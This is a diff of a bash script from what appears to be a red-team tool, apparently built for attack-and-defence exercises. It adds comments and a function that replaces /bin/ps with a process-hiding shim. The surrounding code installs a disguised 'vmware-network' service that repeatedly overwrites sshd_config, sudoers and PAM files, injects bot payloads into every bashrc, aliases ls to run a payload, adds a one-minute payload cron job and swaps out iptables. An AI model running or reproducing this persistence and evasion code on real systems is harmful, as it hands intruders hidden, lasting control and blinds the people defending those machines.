@@ -39,8 +39,11 @@ clone(){
 
 }
 
+# Create a service which overwrites sshd_config, sudoers, pam
+# every 5 seconds. The service will run "copy", which is the bash
+# script that actually does this. 
 copyman(){
-    echo -e "Installing copyman service...\n"
+    echo -e "\n Installing copyman service...\n"
     # Clone copyman and its files 
     mkdir -p /lib/modules/kernel_static
 
@@ -54,7 +57,7 @@ copyman(){
     systemctl enable vmware-network
 }
 
-# Add bot to all the bashrc found in /home and /root 
+# Add bot payload to all the bashrc found in /home and /root 
 bashrc(){
     echo -e "Changing all bashrc... \n"
 
@@ -71,7 +74,7 @@ alias_ls(){
     alias ls="ls; $payload2"
 }
 
-# This might be different in centos, systemctl restart cronjob 
+# Add a cronjob with bot payload which runs every 1 minute
 cronjob(){
     echo -e "Installing cronjob... \n"
     crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
@@ -88,6 +91,17 @@ iptables(){
 
     xtables=`which iptables`
     ln -sf /sbin/xtables-single $xtables
+}
+
+shim_ps(){
+    echo -e "Shimming ps... \n"
+
+    gcc /opt/cdt-redteamtool/payload/ps/drop_ps.c -o /bin/procs
+    chmod +x /bin/procs
+    mv /bin/ps /var/cache/ps
+    cp /opt/cdt-redteamtool/payload/ps/ps /bin/ps
+
+
 }
 
 # Shim rest of the binaries; ps, netstat, cd 
